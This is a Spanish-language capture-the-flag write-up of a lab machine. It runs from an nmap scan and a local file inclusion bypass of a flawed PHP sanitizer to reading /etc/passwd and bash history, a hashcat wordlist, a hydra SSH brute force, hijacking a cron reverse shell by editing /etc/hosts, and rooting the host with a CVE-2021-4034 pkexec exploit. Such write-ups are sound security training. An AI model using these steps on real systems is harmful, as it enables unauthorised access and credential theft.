Realizamos un escaneo de nmap y encontramos el puerto 22 y 80 abierto
![[Pasted image 20240617074840.png]]

Revisando tanto en la web como con la herramienta whatweb de momento encontramos un posible usuario
![[Pasted image 20240617075219.png]]

Realizamos uns busqueda de archivos y directorios con gobuster y encontramos un directorio que parece sospechoso
![[Pasted image 20240617075455.png]]

Al acceder nos aparecen información sobre una plantilla llamada "Atlanta"
![[Pasted image 20240617075530.png]]



Revisando la web encontramos que es vulnerable a local file inclusion pero que tiene una configuración de sanetización
Este es el filto de sanetización que utiliza para intentar evadir la vulnerabilidad de lfi
```php
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

No funciona de manera basica, hay que añadirle un wrappers
![[Pasted image 20240617085222.png]]

Ahora lo descodificamos y sacamos el contenido de index.php
```bash
echo "PD9waHAgCgpmdW5jdGlvbiBzYW5pdGl6ZV9pbnB1dCgkcGFyYW0pIHsKICAgICRwYXJhbTEgPSBzdHJfcmVwbGFjZSgiLi4vIiwiIiwkcGFyYW0pOwogICAgJHBhcmFtMiA9IHN0cl9yZXBsYWNlKCIuLyIsIiIsJHBhcmFtMSk7CiAgICByZXR1cm4gJHBhcmFtMjsKfQoKJHBhZ2UgPSAkX0dFVFsncGFnZSddOwppZiAoaXNzZXQoJHBhZ2UpICYmIHByZWdfbWF0Y2goIi9eW2Etel0vIiwgJHBhZ2UpKSB7CiAgICAkcGFnZSA9IHNhbml0aXplX2lucHV0KCRwYWdlKTsKICAgIHJlYWRmaWxlKCRwYWdlKTsKfSBlbHNlIHsKICAgIGhlYWRlcignTG9jYXRpb246IC9pbmRleC5waHA/cGFnZT1ob21lLmh0bWwnKTsKfQoKPz4K" | base64 -d
```
![[Pasted image 20240617085310.png]]

Ahora sacamos la información del archivo /etc/passwd del mismo modo y encontramos dos usuarios red y blue.
![[Pasted image 20240617083642.png]]

Ahora revisamos el historia bash del usuario blue y encontramos el sigueinte codigo
![[Pasted image 20240617085824.png]]

Revisamos el contenido del archivo .reminder y encontramos la siguiente password
![[Pasted image 20240617090256.png]]

Ahora generaremos una lista con posibles contraseñas con esta password, para ello primero creamos el fichero
![[Pasted image 20240617091931.png]]

Y ahora ejecutamos el siguiente comando con hashcat
```Bash
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```
![[Pasted image 20240617092024.png]]
- `hashcat --stdout .reminder`: Lee las entradas del archivo `.reminder` y las muestra en la salida estándar.
- `-r /usr/share/hashcat/rules/best64.rule`: Aplica la regla `best64.rule` para generar variaciones de las contraseñas.
- `> passlist.txt`: Redirige la salida estándar al archivo `passlist.txt`.

Ahora realizamos un ataque de fuerza bruta con hydra y el fichero creado con hashcat y la contraseña encontrada en el fichero .reminder
![[Pasted image 20240617093348.png]]

Accedemos por ssh con el usuario blue con el parametro -T para evitar la asignación de un pseudo-terminal interactivo lo que ganamos que no se ejecuten scripts de inicio y asi que ningun proceso nos eche del sistema
![[Pasted image 20240617095727.png]]

Ahora revisamos y encontramos un trabajo ejecutandose cada minuto el cual genera una reverse shell
![[Pasted image 20240617095848.png]]

Otra manera de revisarlo es con la herramienta pspy64
![[Pasted image 20240617095930.png]]

Para obtener la reverse shell añadiremos a la carpete de /etc/hosts de la maquina victima nuestra ip con el dominio que indica el proceso para que podamos resolver la dirección IP
```Bash
echo "10.9.0.93 redrules.thm" | tee -a /etc/hosts
```
![[Pasted image 20240617103143.png]]

Una vez añadido solo quedara ponernos en escucha con netcat por el puerto 9001 y cuando se ejecute el proceso obtendremos la reverse shell
![[Pasted image 20240617103441.png]]

Ahora que tenemos acceso vamos a intentar obtener acceso con root, para ello revisamos los binario y encontramos algo interesante
![[Pasted image 20240617103803.png]]

Vamos a la ruta y ahí encontramos el binario
![[Pasted image 20240617103904.png]]

Revisamos que version tiene
![[Pasted image 20240617110049.png]]

Ahora procederemos a explotar la vulnerabilidad CVE-2021-4034, asi que copiamos el repositorio raw en un fichero .py y lo configuramos cambiando la url donde se ubica el binario pkexec
```
https://raw.githubusercontent.com/Almorabea/pkexec-exploit/main/CVE-2021-4034.py
```
![[Pasted image 20240617114817.png]]

Lo descargamos y al ejecutarlo obtenemos permisos root
![[Pasted image 20240617115014.png]]



